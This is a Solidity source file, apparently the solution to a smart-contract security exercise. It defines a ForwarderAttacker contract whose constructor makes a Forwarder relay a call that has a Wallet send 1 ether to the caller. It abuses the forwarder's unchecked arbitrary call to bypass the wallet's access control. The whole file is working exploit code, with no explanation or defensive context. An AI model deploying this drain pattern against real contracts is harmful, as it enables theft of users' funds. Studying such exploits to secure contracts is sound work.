// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Forwarder.sol";

contract ForwarderAttacker {
    constructor(Forwarder forwarder, Wallet wallet) {
        bytes memory data = abi.encodeWithSelector(wallet.sendEther.selector, msg.sender, 1 ether);
        forwarder.functionCall(address(wallet), data);
    }
}
